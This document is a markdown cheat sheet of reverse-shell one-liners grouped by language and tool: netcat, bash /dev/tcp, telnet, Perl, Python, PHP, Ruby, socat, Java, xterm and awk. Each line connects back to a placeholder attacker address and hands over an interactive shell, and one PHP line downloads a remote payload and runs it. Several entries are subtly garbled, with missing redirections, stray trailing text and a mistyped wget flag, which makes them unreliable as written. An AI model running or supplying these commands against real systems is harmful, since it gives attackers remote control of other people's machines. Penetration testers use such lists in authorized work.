# Reverse Shells
## Don't forget to Listen
- nc -lvnp x.x.x.x port
## Netcat 
- nc -c /bin/sh x.x.x.x port
- nc x.x.x.x port -e /bin/bash
- /bin/sh | nc x.x.x.x port
- nc x.x.x.x port | /bin/sh | nc x.x.x.x port
- rm -f /tmp/p; mknod /tmp/p p && nc x.x.x.x port 0/tmp/p 2>&1
## Bash
- bash -i >& /dev/tcp/x.x.x.x/port 0>&1
- exec 5<>/dev/tcp/x.x.x.x/port;cat <&5 | while read line; do $line 2>&5; done
- exec /bin/sh 0</dev/tcp/x.x.x.x/port 1>&0 2>&0
- /bin/bash -i /dev/tcp/x.x.x.x/port 0>&1 2>&1
- 0<&196; exec 196<>/dev/tcp/x.x.x.x/port; sh  <&196 > &196 2>&196
## Telnet
- rm -f /tmp/p; mknod /tmp/p p && telnet x.x.x.x port 0/tmp/p 2>&1
- telnet x.x.x.x port | /bin/bash | telnet x.x.x.x port
- mknod backpipe p && telnet x.x.x.x port 0<backpipe | /bin/bash 1>backpipe
-rm -f x; mknod x p && telnet <IP> <PORT> 0<x | /bin/bash 1>x 
## Perl
- perl -e 'use Socket;$i="x.x.x.x"; $p=port; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S"); exec("/bin/sh -i");};'

- perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<IP>:<PORT>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

- perl -MIO -e "$c=new IO::Socket::INET(PeerAddr,'<IP>:<PORT>');STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;"
## Python
- python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect(("x.x.x.x",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
- php -r '$sock=fsockopen("x.x.x.x",port);exec("/bin/sh -i <&3 >&3 2>&3");'
## Ruby
- ruby -rsocket -e'f=TCPSocket.open("x.x.x.x",port).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' nc -e /bin/sh
- ruby -rsocket -e 'exit if fork;c=TCPSocket.new("x.x.x.x",port);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
-ruby -rsocket -e "c=TCPSocket.new("x.x.x.x",port);while(cmd=c.gets);IO.popen(cmd,'r'){|io|c.print io.read}end"

## PHP
- cd /tmp && wget -0 bd.php x.x.x.x/test/payload.php.txt && php -f bd.php
- php -r '$s=fsockopen("x.x.x.x",port);exec("/bin/sh -i <&3 >&3 2>&3");'
- php -r '$s=fsockopen("x.x.x.x",port);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
- php -r '$s=fsockopen("x.x.x.x",port);`/bin/sh -i <&3 >&3 2>&3`;'
- php -r '$s=fsockopen("x.x.x.x",port);system("/bin/sh -i <&3 >&3 2>&3");'
- php -r '$s=fsockopen("x.x.x.x",port);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
## Socat
- socat tcp-connect:x.x.x.x:port exec:"bash -li",pty,stderr,setsid,sigint,sane
## Java
- r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/x.x.x.x/port;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
## Xterm
- Xnest :1 AND - xhost +x.x.x.x
- xterm -display x.x.x.x:1
- /usr/openwin/bin/xterm -display x.x.x.x:1
## Awk
- awk 'BEGIN {s = "/inet/tcp/0/x.x.x.x/port"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null